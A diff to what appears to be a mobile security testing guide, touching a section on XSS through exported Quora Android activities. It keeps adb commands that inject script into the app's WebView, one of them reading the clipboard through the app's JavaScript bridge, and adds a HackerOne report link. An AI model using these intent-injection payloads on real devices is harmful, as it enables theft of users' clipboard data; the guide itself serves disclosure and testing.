@@ -190,7 +190,7 @@ Sergey Bobrov was able to take advantage of this in the following [HackerOne rep
 adb shell
 am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html 'XSS<script>alert(123)</script>'
 ```
-- Writing to clipboard
+- Clipboard Data
 ```bash
 am start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '<script>alert(QuoraAndroid.getClipboardData());</script>'
 ```
@@ -244,4 +244,8 @@ A [reflected XSS attack](https://www.owasp.org/index.php/Testing_for_Reflected_C
 #### CWE
 
 - CWE-20 - Improper Input Validation
+
+#### XSS via start ContentActivity
+
+- https://hackerone.com/reports/189793
 
